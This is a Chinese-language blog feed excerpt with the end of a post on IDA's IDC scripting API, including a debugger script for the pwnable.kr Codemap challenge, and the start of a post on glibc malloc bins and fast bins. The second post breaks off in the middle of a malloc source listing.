<p>运行时错误会使一段脚本立即终止运行。当然，当一个脚本运行时间过长，也会发生运行时错误。</p>
<p>调试IDC脚本很麻烦，除了大量使用输出语句外，没有其他办法调试IDC脚本。</p>
<h3 id="1-8-IDC永久数据存储"><a href="#1-8-IDC永久数据存储" class="headerlink" title="1.8 IDC永久数据存储"></a>1.8 IDC永久数据存储</h3><p>前面提到IDC没有传统意义上的数据，即声明一个大型存储块，然后使用下标访问块中的数据项的数组。但是IDC确实有全局永久数组，这可以看成已命名的永久对象，而且这些对象是稀疏数组。数组中的同时保存一个整数值和一个字符串值，IDC的全局数组无法存储浮点值。</p>
<ul>
<li>long CreateArray(string name)   返回数组句柄</li>
<li>long GetArrayId(string name)  返回索引句柄</li>
<li>long SetArrayLong(long id, long idx, long value)  将整数value存储到数组id中idx位置</li>
<li>long SetArrayString(long id, long idx, string str)</li>
<li>string or long GetArrayElement(long tag, long id, long idx)  提取的是整数还是字符串，有tag参数的值决定，必须是常量AR_LONG（整数）或AR_STR（字符串）</li>
<li>long DelArrayElement(long tag, long id, long idx)</li>
<li>void DeleteArray(long id) 删除句柄id对应的数组</li>
<li>long RenameArray(long id, string newname)</li>
</ul>
<h2 id="2、IDC的常用函数"><a href="#2、IDC的常用函数" class="headerlink" title="2、IDC的常用函数"></a>2、IDC的常用函数</h2><h3 id="2-1-读取和修改数据的函数"><a href="#2-1-读取和修改数据的函数" class="headerlink" title="2.1 读取和修改数据的函数"></a>2.1 读取和修改数据的函数</h3><ul>
<li>long Byte(long addr)      从虚拟地址addr中读取一个字节值</li>
<li>long Word(long addr)      从虚拟地址addr中读取一个字（2字节）值</li>
<li>long Dword(long addr)      从虚拟地址addr中读取一个双字（4字节）值</li>
<li>void PatchByte(long addr, long val)   设置虚拟地址addr处的一个字节值</li>
<li>void PatchWord(long addr, long val)   设置虚拟地址addr处的一个字值</li>
<li>void PatchDword(long addr, long val)   设置虚拟地址addr处的一个双字值</li>
<li>bool isLoaded(long addr)   如果addr包含有效数据，则返回1，否则0</li>
</ul>
<p>需要注意的是，我们在做这种操作的时候应该考虑字节顺序。</p>
<h3 id="2-2-用户交互函数"><a href="#2-2-用户交互函数" class="headerlink" title="2.2 用户交互函数"></a>2.2 用户交互函数</h3><ul>
<li>void Message(string format, ...)   格式化打印。接受printf风格的格式化字符串</li>
<li>void print(...)   在输出窗口打印每个参数的字符串表示形式</li>
<li>void Wording(string format, ...)   对话框中显示一条格式化信息</li>
<li>string AskStr(string default, string prompt)  显示一个输入框，要求用户输入一个额字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</li>
<li>string AskFile(long doSave, string mask, string prompt)  显示一个文件选择对话框，以简化选择文件的任务。新文件保存数据(doSave=1)，或选择现有的文件读取数据(doSave=0)。可以根据mask（如*.*或*.idc）过滤显示的文件列表。如果操作成功，则会返回选定文件的名称；如果对话框被取消，返回0</li>
<li>string AskYN(long default, string prompt)  用是或否的问题提示用户。突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个选定答案的整数。</li>
<li>long ScreenEA()   返回当前光标所在位置的虚拟地址</li>
<li>bool Jump(long addr)  跳转到反汇编窗口的指定地址</li>
</ul>
<h3 id="2-3-字符串操纵函数"><a href="#2-3-字符串操纵函数" class="headerlink" title="2.3 字符串操纵函数"></a>2.3 字符串操纵函数</h3><ul>
<li>string form(string format, ...)   //preIDA5.6  类似c语言的sprintf函数，返回一个新年字符串，该字符串根据所提供的格式化字符串和值进行格式化</li>
<li>string sprintf(string format, ...)  //IDA5.6+  sprintf用于替代form</li>
<li>long atol(string val)   将十进制值val转化成对应的整数值</li>
<li>long xtol(string val)  将十六进制值val（可选择以0x开头）转换成对应的整数值</li>
<li>string ltoa(long val, long radix)  以指定的radix(2、8、10或16)返回val的字符串值</li>
<li>string ord(string ch)  返回单字符字符串ch的ASCII值</li>
<li>long strlen(string str)  返回所提供字符串的长度</li>
<li>long strstr(string str, string substr)  返回str中substr的索引，如果没有发现子字符串，则返回-1</li>
<li>string substr(string str, long start, long end)  返回包含str中由start到end-1位置的字符的子字符串。如果使用分片，此字符串等同于str[start:end]</li>
</ul>
<h3 id="2-4-文件输入-输出函数"><a href="#2-4-文件输入-输出函数" class="headerlink" title="2.4 文件输入/输出函数"></a>2.4 文件输入/输出函数</h3><ul>
<li>long fopen(string filename, string mode)  返回一个整数文件句柄（如果发生错误，则返回0），供所有IDC文件 输入/输出函数使用。mode参数与C语言的fopen函数使用相同的模式(r,w,等)</li>
<li>void fclose(long handle)  关闭fopen中文件句柄指定的文件</li>
<li>void filelength(long handle)  返回指定文件的长度，如果发生错误，则返回-1</li>
<li>long fgetc(long handle)  从给定文件中读取一个字节。如果发生错误，则返回-1</li>
<li>long fputc(long val, long handle)  写入一个字节到指定文件中，如果操作成功，则返回0；如果发生错误，则返回-1</li>
<li>long fprintf(long handle, string format, ...)  将格式化字符串写入到指定文件中</li>
<li>long writestr(long handle, string str)  将指定的字符串写入到给定文件中</li>
<li>string/long readstr(long handle)  从给定文件中读取一个字符串。这个函数读取到下一个换行符位置的所有字符（包括非ASCII字符），包括换行符本身（ASCII 0x0a）。操作成功，返回字符串；如果读到文件结尾，则返回-1</li>
<li>long writelong(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个4字节整数写入到指定文件</li>
<li>long readlong(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个4字节整数</li>
<li>long writeshort(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个2字节整数写入到指定文件</li>
<li>long readshort(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个2字节整数</li>
<li>bool loadfile(long handle, long pos, long addr, long length)  从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中</li>
<li>bool savefile(long handle, long pos, long addr, long length)  将以addr数据库地址开头的length数量的字节写入到给定文件的pos位置</li>
</ul>
<h3 id="2-5-操纵数据库名称"><a href="#2-5-操纵数据库名称" class="headerlink" title="2.5 操纵数据库名称"></a>2.5 操纵数据库名称</h3><ul>
<li>string Name(long addr)  返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不敢回用户定义的名称</li>
<li>string NameEx(long from, long addr)  返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称。</li>
<li>bool MakeNameEx(long addr, string name, long flags)  将给定的名称分配给给定的地址。改名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的MakeNameEx文档中记载描述，可以用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出。</li>
<li>long LockByName(string name)  返回一个位置（名称已给定）的地址。如果数据库中没有该名称，则返回BADADDR(-1)</li>
<li>long LockByNameEx(long funcaddr, string localname)  在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR（-1）</li>
</ul>
<h3 id="2-6-处理函数的函数"><a href="#2-6-处理函数的函数" class="headerlink" title="2.6 处理函数的函数"></a>2.6 处理函数的函数</h3><ul>
<li>long GetFunctionAttr(long addr, long attrib)  返回包含给定地址的函数的被请求的属性。文档中有属性常量。如要查找一个函数的结束地址，可以使用GetFunctionAttr(addr, FUNCTION_END)</li>
<li>string GetFunctionName(long addr)  返回包含给定地址的函数的名称。如果给定地址并不属于一个函数，则返回一个空字符串</li>
<li>long NextFunction(long addr)  返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
<li>long PrevFunction(long addr)  返回给定地址之前距离最近的函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
</ul>
<p>当然，也可以通过函数名，使用LockByName函数查找函数的起始地址</p>
<h3 id="2-7-代码交叉引用函数"><a href="#2-7-代码交叉引用函数" class="headerlink" title="2.7 代码交叉引用函数"></a>2.7 代码交叉引用函数</h3><ul>
<li>long Rfirst(long from)  返回给定地址向其转交控制权的第一个位置。如果给定地址没有引用其他地址，则返回BADAADDR（-1）</li>
<li>long Rnext(long from, long current)  如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址(from)转交控制权的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
<li>long XrefType()  返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN（近调用）、fl_CF（远调用）、fl_JN（近跳转）、fl_JF（远跳转）和fl_F（普通顺序流）</li>
<li>long RfirstB(long to)  返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR（-1）</li>
<li>long RnextB(long to, long current)  如果current已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权给给定地址(to)的位置。如果不存在其他堆给定位置的交叉引用，则返回BADADDR（-1）</li>
</ul>
<p>每次调用一个交叉引用函数，IDA都会设置一个内部IDC状态变量，指出返回的最后一个交叉引用的类型。如果需要知道你收到的交叉引用的类型，那么在调用其他交叉引用查询函数之前，必须调用XrefType函数</p>
<h3 id="2-8-数据交叉引用函数"><a href="#2-8-数据交叉引用函数" class="headerlink" title="2.8 数据交叉引用函数"></a>2.8 数据交叉引用函数</h3><ul>
<li>long Dfirst(long from)  返回给定地址引用一个数据值得第一个位置。如果给定地址没有引用其他地址，则返回BADADDR</li>
<li>long Dnext(long from, long current)   如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址(from)向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
<li>long XrefType()   返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0（提供的偏移量）、dr_w（数据写入）和dr_R（数据读取）</li>
<li>long DfirstB(long to)  返回将给定地址作为数据引用的第一个位置。如果不存在引用给定地址的交叉引用，则返回BADADDR</li>
<li>long DnextB(long to, long current)  如果current已经在前一次调用DfirstB或DnextB时返回，则返回将给定地址（to）作为数据引用的下一个位置。如果没有其他对给定地址的交叉引用存在，则返回BADADDR</li>
</ul>
<p>和代码交叉引用一样，如果需要知道你收到的交叉引用的类型，那么在调用另一个交叉引用查询函数之前，必须调用XrefType函数</p>
<h3 id="2-9-数据库操纵函数"><a href="#2-9-数据库操纵函数" class="headerlink" title="2.9 数据库操纵函数"></a>2.9 数据库操纵函数</h3><ul>
<li>void MakeUnkn(long addr, long flags)  取消位于指定地址的项的定义。这里的标志指出是否也取消随后的想的定义，以及是否删除任何与取消定义的项有关的名称。</li>
<li>long MakeCode(long addr)  将位于指定地址的字节转换成一条指令</li>
<li>long MakeByte(long addr)   将位于指定地址的项目转换成一个数据字节</li>
<li>long MakeWord(long addr)</li>
<li>long MakeDword(long addr)</li>
<li>bool MakeComm(long addr, string comment)  在给定的地址处添加一条常规注释</li>
<li>bool MakeFunction(long begin, long end)  将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-1），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址</li>
<li>bool MakeStr(long begin, long end)  创建一个当前字符串(由GetStringType返回)类型的字符串，涵盖由begin到end-1之间的所有字节。如果end被指定为BADADDR，IDA会尝试自动确定字符串的结束地址</li>
</ul>
<h3 id="2-10-数据库搜索函数"><a href="#2-10-数据库搜索函数" class="headerlink" title="2.10 数据库搜索函数"></a>2.10 数据库搜索函数</h3><p>三个最常见的标志为</p>
<ol>
<li>SEARCH_DOWN  搜索操作扫描高位地址</li>
<li>SEARCH_NEXT  略过当前匹配项，扫描下一个匹配项</li>
<li>SEARCH_CASE  区分大小写的方式进行二进制和文本搜索</li>
</ol>
<ul>
<li>long FindCode(long addr, long flags)  从给定的地址搜索一条指令</li>
<li>long FindDate(long addr, long flags)   从给定的地址搜索一个数据项</li>
<li>long FindBinary(long addr, long flags, string binary)  从给定的地址搜索一个字节序列。字符串binary指定一个十六进制字节序列值。如果没有设置SEARCH_CASE，且一个字节值指定一个大写或小写ASCII字母，则搜索仍然会匹配对应的互补值。例如&quot;41 42&quot;将匹配&quot;61 62&quot;、&quot;61 42&quot;等</li>
<li>long FindText(long addr, long flags, long row, long column, string text)  在约定的地址，从给定行(row)的给定列搜索字符串text。注意，某个给定地址的反汇编文本可能会跨越几行，因此要指定从哪一行开始搜索</li>
</ul>
<h3 id="2-11-反汇编行组件"><a href="#2-11-反汇编行组件" class="headerlink" title="2.11 反汇编行组件"></a>2.11 反汇编行组件</h3><ul>
<li>string GetDisasm(long addr)  返回给定地址的反汇编文本。返回的文本包括任何注释，但不包括地址信息</li>
<li>string GetMnem(long addr)  返回位于给定地址的指令的助记符部分</li>
<li>string GetOpnd(long addr, long opnum)  返回给定地址的指定操作数的文本形式。IDA以0为其实编号，从左向右对操作数编号</li>
<li>long GetOpType(long addr, long opnum)  返回一个整数，指出给定地址的给定操作数的类型。</li>
<li>long GetOperandValue(long addr, long opnum)  返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型</li>
<li>string CommentEx(long addr, long type)  返回给定地址处的注释文本。如果type为0，则返回常规注释文本；如果type为1，则返回可重复注释的文本。如果给定地址没注释，则返回空字符串。</li>
</ul>
<h2 id="3、IDC脚本示例"><a href="#3、IDC脚本示例" class="headerlink" title="3、IDC脚本示例"></a>3、IDC脚本示例</h2><h3 id="3-1-pwnable-kr中Codemap的idc脚本"><a href="#3-1-pwnable-kr中Codemap的idc脚本" class="headerlink" title="3.1 pwnable.kr中Codemap的idc脚本"></a>3.1 pwnable.kr中Codemap的idc脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;  </div><div class="line"></div><div class="line">static main()&#123;  </div><div class="line"></div><div class="line">    auto max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx;  </div><div class="line">    auto eax, ebx;  </div><div class="line"></div><div class="line">    // 依次为前三大堆块分配完成时的eax和ebx值</div><div class="line">    max_eax = 0;  </div><div class="line">    second_eax = 0;  </div><div class="line">    third_eax = 0;  </div><div class="line">    max_ebx = 0;  </div><div class="line">    second_ebx = 0;  </div><div class="line">    third_ebx = 0;  </div><div class="line"></div><div class="line">    AddBpt(0x1173E65);      // 在提示位置添加断点，在IDA中该地址为0x1173E65</div><div class="line">    StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;);  </div><div class="line">    auto count;  </div><div class="line">    for(count = 0; count &lt; 999; count ++)&#123;  </div><div class="line">        auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1);  </div><div class="line">        eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</div><div class="line">        ebx = GetRegValue(&quot;EBX&quot;);  </div><div class="line"></div><div class="line">        // 判断是否应刷新前三大堆块的值</div><div class="line">        if(max_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = max_eax;  </div><div class="line">            second_ebx = max_ebx;  </div><div class="line">            max_eax = eax;  </div><div class="line">            max_ebx = ebx;  </div><div class="line">        &#125;else if(second_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = eax;  </div><div class="line">            second_ebx = ebx;  </div><div class="line">        &#125;else if(third_eax &lt; eax)&#123;  </div><div class="line">            third_eax = eax;  </div><div class="line">            third_ebx = ebx;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    // 输出</div><div class="line">    Message(&quot;max eax: %d, ebx: %x, second eax: %d, ebx: %x, third eax: %d, ebx: %x\n&quot;, max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>AddBpt(0x1173E65)   设置断点</li>
<li>StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;)   这里是直接启用本地调试器</li>
<li>auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1)</li>
<li>eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ida </tag>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux堆内存管理深入分析（下）]]></title>
      <url>/2017/09/15/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="0-前言回顾"><a href="#0-前言回顾" class="headerlink" title="0 前言回顾"></a>0 前言回顾</h2><p>在上一篇文章中（链接见文章底部），详细介绍了堆内存管理中涉及到的基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。通过前面的介绍，我们知道使用隐式链表来管理内存chunk总会涉及到内存的遍历，效率极低。对此glibc malloc引入了显示链表技术来提高堆内存分配和释放的效率。</p>
<p>所谓的显示链表就是我们在数据结构中常用的链表，而链表本质上就是将一些属性相同的“结点”串联起来，方便管理。在glibc malloc中这些链表统称为bin，链表中的“结点”就是各个chunk，结点的共同属性就是：</p>
<ul>
<li>均为free chunk；</li>
</ul>
<ul>
<li>同一个链表中各个chunk的大小相等(有一个特例，详情见后文)。</li>
</ul>
<h2 id="1-bin介绍"><a href="#1-bin介绍" class="headerlink" title="1 bin介绍"></a>1 bin介绍</h2><p>如前文所述，<font color="#f00"><strong>bin是一种记录free chunk的链表数据结构</strong></font>。系统针对不同大小的free chunk，将bin分为了4类：1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin。</p>
<p>在glibc中用于记录bin的数据结构有两种，分别如下所示：</p>
<p><strong>fastbinsY</strong>: 这是一个数组，用于记录所有的fast bins；</p>
<p><strong>bins</strong>: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是：</p>
<ul>
<li>bin 1 为unsorted bin;</li>
</ul>
<ul>
<li>bin 2 到63为small bin;</li>
</ul>
<ul>
<li>bin 64到126为large bin。</li>
</ul>
<p>其中具体数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  <span class="comment">// #define NBINS    128</span></div><div class="line">  ……</div><div class="line">&#125;;</div><div class="line">这里mfastbinptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></div><div class="line">mchunkptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></div></pre></td></tr></table></figure>
<p>画图更直观：</p>
<p><img src="/images/2017-09-15/420rbsdeo2o0.png" alt=""></p>
<p>那么处于bins中个各个free chunk是如何链接在一起的呢？回顾malloc_chunk的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line"> </div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中的fd和bk指针就是指向当前chunk所属的链表中forward或者backward chunk。</p>
<h2 id="2-Fast-bin"><a href="#2-Fast-bin" class="headerlink" title="2 Fast bin"></a>2 Fast bin</h2><p>既然有fast bin，那就肯定有fast chunk——chunk size为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1249" target="_blank" rel="external">16</a>到<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1600" target="_blank" rel="external">80</a>字节的chunk就叫做fast chunk。为了便于后文描述，这里对chunk大小做如下约定：</p>
<p>1)      只要说到chunk size，那么就表示该malloc_chunk的实际整体大小；</p>
<p>2)      <strong>而说到chunk unused size，就表示该malloc_chunk中刨除诸如prev_size, size, fd和bk这类辅助成员之后的实际可用的大小。因此，对free chunk而言，其实际可用大小总是比实际整体大小少16字节。</strong></p>
<p>在内存分配和释放过程中，fast bin是所有bin中操作速度最快的。下面详细介绍fast bin的一些特性：</p>
<p>1) fast bin的个数——10个</p>
<p>2)每个fast bin都是一个单链表(<strong>只使用fd指针</strong>)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“<strong>链表尾</strong>”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推，如图所示。</p>
<p>在main arena中Fast bins(即数组fastbinsY)的整体操作示意图如下图所示：</p>
<p><img src="/images/2017-09-15/420rc04q9ad0.png" alt=""></p>
<p>​                        图2-1 fast bin示意图</p>
<p>3) chunk size：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此<strong>默认情况下大小为16到80字节的chunk被分类到fast chunk</strong>。详情如上图</p>
<p>4) 不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的<strong>小内存</strong>分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</p>
<p>5) malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></div><div class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</div><div class="line"> </div><div class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></div><div class="line"><span class="comment">/*这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8，fastbin_index就是根据要malloc的size来快速计算该size应该属于哪一个fast bin，即该fast bin的索引。因为fast bin中chunk是从16字节开始的，所有这里以8字节为单位(32位系统为例)有减2*8 = 16的操作！*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></div><div class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="comment">/* The maximum fastbin request size we support */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></div></pre></td></tr></table></figure>
<p>那么fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：</p>
<ul>
<li>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li>
</ul>
<ul>
<li>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。</li>
</ul>
<p>然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin(见下面代码中的※1部分)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</div><div class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/*</span></div><div class="line">     If the size qualifies as a fastbin, first check corresponding bin.</div><div class="line">     This code is safe to execute even if av is not yet initialized, so we</div><div class="line">     can try it without checking, which saves some time on this fast path.</div><div class="line">   */</div><div class="line">   <span class="comment">//第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0</span></div><div class="line">   <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</div><div class="line">    &#123;</div><div class="line">  ※<span class="number">1</span>  idx = fastbin_index (nb);</div><div class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</div><div class="line">      mchunkptr pp = *fb;</div><div class="line">      <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">          victim = pp;</div><div class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">   ※<span class="number">2</span> <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim);</div><div class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</div><div class="line">            &#123;</div><div class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</div><div class="line">            errout:</div><div class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim));</div><div class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">            &#125;</div><div class="line">          check_remalloced_chunk (av, victim, nb);</div><div class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</div><div class="line">          alloc_perturb (p, bytes);</div><div class="line">          <span class="keyword">return</span> p;</div><div class="line">        